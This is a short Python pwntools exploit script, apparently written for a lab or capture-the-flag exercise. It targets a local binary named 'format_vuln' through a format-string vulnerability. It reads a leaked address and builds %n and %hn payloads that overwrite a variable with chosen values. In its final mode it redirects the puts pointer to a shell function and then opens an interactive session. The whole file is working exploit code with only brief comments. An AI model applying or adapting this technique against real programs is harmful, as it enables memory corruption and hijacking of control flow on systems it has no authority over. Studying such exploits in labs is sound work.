from pwn import *
from sys import argv
import time

if len(argv) < 2:
	exit()

GOAL1 = 0x1337
GOAL2 = 0xdeadbeef

SHELL = 0x5655560d 
PUTS = 0x56556bac

p = process("./format_vuln")

p.recvline()
p.recvuntil(": ")
i_addr = int(p.recvline()[:-1], 16)

if argv[1] == "1":
	EGG = p32(i_addr) + "%10$n" #Changed i!
	print EGG
elif argv[1] == "2":
	EGG = p32(i_addr) + "%" + str(int(GOAL1 - 4)) + "c%10$ln" #Naive way
elif argv[1] == "3":
	EGG = p32(i_addr) + "%" + str(int(GOAL2 - 4)) + "c%10$ln" #Naive way - slow, if at all
	print EGG
elif argv[1] == "4":
	# gdb.attach(p)
	# time.sleep(5)
	
	i_addr2 = i_addr + 2
	EGG = p32(i_addr) + p32(i_addr2) # Adds addresses of i to string
	first_write = GOAL2 & 0xffff # Removes beef leaving dead
	first_write = first_write - len(EGG) # Subtract bytes already written
	EGG += "%" + str(first_write) + "c" + "%10$hn" # Overwrite lower bytes
	
	second_write = GOAL2 >> 16 # Removes beef, leaving dead
	second_write = second_write - first_write - 8
	EGG += "%" + str(second_write) + "c" + "%11$hn"

	#print EGG
else:
	# gdb.attach(p)
	# time.sleep(5)
	PUTS2 = PUTS + 2
	EGG = p32(PUTS) + p32(PUTS2)
	first_write = SHELL & 0xffff 
	first_write = first_write - len(EGG) # Subtract bytes already written
	EGG += "%" + str(first_write) + "c" + "%10$hn" # Overwrite lower bytes
	
	second_write = SHELL >> 16 
	second_write = second_write - first_write - 8
	EGG += "%" + str(second_write) + "c" + "%11$hn"
	#print EGG

p.sendline(EGG)
p.interactive()
